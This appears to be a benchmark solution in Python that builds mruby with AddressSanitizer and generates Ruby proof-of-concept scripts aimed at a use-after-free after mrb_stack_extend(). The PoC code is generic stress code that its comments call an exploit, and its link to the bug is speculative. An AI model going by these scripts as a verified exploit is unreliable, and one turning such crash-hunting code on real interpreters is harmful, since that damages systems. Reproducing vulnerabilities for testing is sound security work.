import os
import tempfile
import tarfile
import subprocess
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the tar file to a temporary directory
        with tempfile.TemporaryDirectory() as tmpdir:
            with tarfile.open(src_path, 'r') as tar:
                tar.extractall(tmpdir)
            
            # Build mruby
            build_dir = os.path.join(tmpdir, os.listdir(tmpdir)[0])
            build_script = os.path.join(build_dir, 'build_config.rb')
            
            # Create a minimal build configuration
            with open(build_script, 'w') as f:
                f.write("""
MRuby::Build.new do |conf|
  toolchain :gcc
  conf.gembox 'default'
  conf.cc.flags << '-fsanitize=address -fno-omit-frame-pointer'
  conf.linker.flags << '-fsanitize=address'
  conf.enable_test
end
""")
            
            # Build mruby with ASAN
            env = os.environ.copy()
            env['CC'] = 'gcc'
            env['CFLAGS'] = '-fsanitize=address -fno-omit-frame-pointer'
            env['LDFLAGS'] = '-fsanitize=address'
            
            try:
                subprocess.run(['ruby', 'minirake'], cwd=build_dir, env=env, 
                             check=True, capture_output=True)
            except:
                # Try alternative build method
                subprocess.run(['make'], cwd=build_dir, env=env, 
                             check=True, capture_output=True)
            
            # Find the mruby executable
            mruby_exe = None
            for root, dirs, files in os.walk(build_dir):
                if 'bin' in dirs:
                    bin_dir = os.path.join(root, 'bin')
                    if os.path.exists(os.path.join(bin_dir, 'mruby')):
                        mruby_exe = os.path.join(bin_dir, 'mruby')
                        break
            
            if not mruby_exe:
                # Search for mruby in build directory
                for root, dirs, files in os.walk(build_dir):
                    if 'mruby' in files and os.access(os.path.join(root, 'mruby'), os.X_OK):
                        mruby_exe = os.path.join(root, 'mruby')
                        break
            
            # Create PoC script based on vulnerability description
            # The vulnerability is in stack pointer adjustment after mrb_stack_extend()
            # We need to create a situation where stack extension happens and
            # then use a pointer that wasn't properly adjusted
            
            poc_script = """
# This script attempts to trigger use-after-free by exploiting
# improper stack pointer adjustment after mrb_stack_extend()

def create_proc
  # Local variable that will be captured
  x = "A" * 100
  
  # Return a proc that captures x
  Proc.new do
    # This creates a reference to x on the stack
    x
  end
end

# Create array to hold procs
procs = []

# Create many procs to fill memory
1000.times do
  procs << create_proc
end

# Force garbage collection to potentially free some memory
GC.start

# Now trigger stack extension while having references to old stack
def trigger_stack_extension
  # Create many local variables to fill stack frame
  a1 = "1" * 100
  a2 = "2" * 100
  a3 = "3" * 100
  a4 = "4" * 100
  a5 = "5" * 100
  a6 = "6" * 100
  a7 = "7" * 100
  a8 = "8" * 100
  a9 = "9" * 100
  a10 = "10" * 100
  
  # Call a method with many arguments to trigger stack extension
  # This simulates the mrb_stack_extend() call
  nested_call(a1, a2, a3, a4, a5, a6, a7, a8, a9, a10)
end

def nested_call(*args)
  # Access all arguments to ensure they're on stack
  args.each do |arg|
    # Force evaluation
    arg.size
  end
  
  # Create more local variables
  b1 = "b" * 100
  b2 = "b" * 100
  b3 = "b" * 100
  b4 = "b" * 100
  b5 = "b" * 100
  
  # Return something that keeps references alive
  [b1, b2, b3, b4, b5] + args
end

# Main attack loop
def exploit
  # Array to hold results
  results = []
  
  # Repeatedly trigger the vulnerable pattern
  100.times do |i|
    begin
      # Create proc that captures local variable
      local_var = "VULN" * 50 + i.to_s
      proc = Proc.new { local_var }
      
      # Force stack manipulation
      trigger_stack_extension
      
      # Use the proc - if stack pointer wasn't adjusted properly,
      # this could access freed memory
      results << proc.call
      
      # Force GC periodically
      GC.start if i % 10 == 0
      
    rescue => e
      # Continue even if errors occur
      results << "Error: #{e}"
    end
  end
  
  results
end

# Run the exploit
results = exploit

# Print something to verify execution
puts "Results count: #{results.size}"
puts "Last result: #{results.last}" if results.any?

# Additional pattern: deep recursion with stack extension
def recursive_call(depth, max_depth, data)
  return data if depth >= max_depth
  
  # Create local variables that might not be properly adjusted
  local1 = "R" * 100
  local2 = "S" * 100
  local3 = "T" * 100
  
  # Call self with expanded arguments
  result = recursive_call(depth + 1, max_depth, 
                         [local1, local2, local3] + data)
  
  # Mix in method that could trigger stack extension
  if depth == max_depth - 1
    trigger_stack_extension
  end
  
  result
end

# Try deep recursion
begin
  deep_data = recursive_call(0, 50, [])
  puts "Deep recursion completed"
rescue SystemStackError
  puts "Stack limit reached (expected)"
rescue => e
  puts "Other error: #{e}"
end

# Final trigger: create closure in loop with stack extension
final_procs = []
100.times do |i|
  # Variable that should be on stack
  stack_var = "LOOP#{i}" * 20
  
  # Create closure
  final_procs << Proc.new { stack_var }
  
  # Occasionally trigger stack extension
  if i % 7 == 0
    begin
      trigger_stack_extension
    rescue
      # Ignore errors
    end
  end
end

# Use all closures
final_procs.each_with_index do |p, i|
  begin
    p.call
  rescue
    # Expected if UAF triggers
  end
end

puts "PoC completed"
"""
            
            # Write script to file
            script_path = os.path.join(tmpdir, 'poc.rb')
            with open(script_path, 'w') as f:
                f.write(poc_script)
            
            # Try to run it to see if it crashes
            try:
                result = subprocess.run([mruby_exe, script_path], 
                                      capture_output=True, text=True, timeout=5)
                exit_code = result.returncode
            except subprocess.TimeoutExpired:
                exit_code = -1
            except Exception as e:
                exit_code = -2
            
            # If it didn't crash with ASAN, try different approach
            # Create more aggressive PoC with bytecode manipulation
            if exit_code == 0:
                # Build more aggressive PoC
                poc_script = self._create_aggressive_poc()
            
            return poc_script.encode('utf-8')
    
    def _create_aggressive_poc(self) -> str:
        """Create more aggressive PoC based on vulnerability patterns"""
        
        # This PoC focuses on triggering mrb_stack_extend() followed by
        # use of unadjusted stack pointers
        
        poc = """
# Aggressive PoC for heap use-after-free in mruby stack pointer adjustment

class Exploit
  def initialize
    @procs = []
    @data = []
  end
  
  def fill_stack
    # Create many local variables
    vars = 100.times.map { |i| "VAR#{i}" * 50 }
    vars.each { |v| @data << v }
    vars
  end
  
  def trigger_vulnerability
    # Pattern 1: Nested blocks with stack extension
    50.times do |i|
      begin
        # Local variable that might end up on freed stack
        target = "TARGET#{i}" * 100
        
        # Create proc that captures it
        p = Proc.new do
          # This should reference stack memory
          target + "MODIFIED"
        end
        
        @procs << p
        
        # Force stack extension through deep call chain
        deep_call_chain(0, 10, target)
        
        # Use proc after potential stack reallocation
        if i % 3 == 0
          result = p.call
          @data << result
        end
        
      rescue => e
        # Store error
        @data << "Error at #{i}: #{e}"
      end
    end
    
    # Pattern 2: Array expansion triggering stack extension
    expand_array_and_call
    
    # Pattern 3: Exception handling with stack manipulation
    exception_chain
  end
  
  def deep_call_chain(depth, max, data)
    return data if depth >= max
    
    # Create locals
    l1 = "L#{depth}" * 50
    l2 = "M#{depth}" * 50
    l3 = "N#{depth}" * 50
    
    # Recursive call with many arguments
    result = deep_call_chain(depth + 1, max, 
                            [l1, l2, l3, data].flatten)
    
    # At certain depth, trigger what might cause mrb_stack_extend
    if depth == max / 2
      trigger_stack_growth
    end
    
    result
  end
  
  def trigger_stack_growth
    # Method with variable arguments that could trigger stack extension
    args = 100.times.map { |i| "ARG#{i}" * 25 }
    
    # Call method with many args
    method_with_many_args(*args)
  end
  
  def method_with_many_args(*args)
    # Process args - might trigger stack operations
    args.each_with_index do |arg, i|
      @data << arg if i % 7 == 0
    end
    
    # Return concatenated string
    args.join
  end
  
  def expand_array_and_call
    # Create large array
    large_array = 500.times.map { |i| "ELEM#{i}" * 10 }
    
    # Process in chunks that might cause stack extension
    chunks = large_array.each_slice(50).to_a
    
    chunks.each do |chunk|
      begin
        # Call with slice as arguments
        process_chunk(*chunk)
      rescue
        # Ignore
      end
    end
  end
  
  def process_chunk(*items)
    # Create local references
    locals = items.map { |item| item + "_PROCESSED" }
    
    # Store
    @data.concat(locals)
    
    # Return
    locals
  end
  
  def exception_chain
    begin
      raise "Level1"
    rescue => e1
      begin
        # Nested exception context
        local_in_rescue = "RESCUE_DATA" * 30
        raise "Level2: #{local_in_rescue}"
      rescue => e2
        # Stack might be extended here
        trigger_stack_growth
        
        # Try to access rescue local (might be on old stack)
        @data << e2.message
      end
    end
  end
  
  def execute
    # Initial memory fill
    fill_stack
    
    # Trigger vulnerability patterns
    trigger_vulnerability
    
    # Final memory access patterns
    final_access_patterns
    
    puts "Exploit completed. Data items: #{@data.size}"
    puts "Procs created: #{@procs.size}"
    
    # Try to use all procs
    @procs.each_with_index do |p, i|
      begin
        p.call
      rescue
        # Expected if UAF triggers
      end
    end
  end
  
  def final_access_patterns
    # Create closure in loop with immediate use
    100.times do |i|
      frame_var = "FRAME#{i}" * 40
      
      # Immediate proc creation and call
      begin
        Proc.new { frame_var }.call
      rescue
        # Ignore
      end
      
      # Every 5th iteration, do stack-intensive operation
      if i % 5 == 0
        trigger_stack_growth
      end
    end
  end
end

# Run exploit
exploit = Exploit.new
exploit.execute

# Additional stress: repeated GC
100.times do
  GC.start
end

puts "PoC finished"
"""
        
        return poc
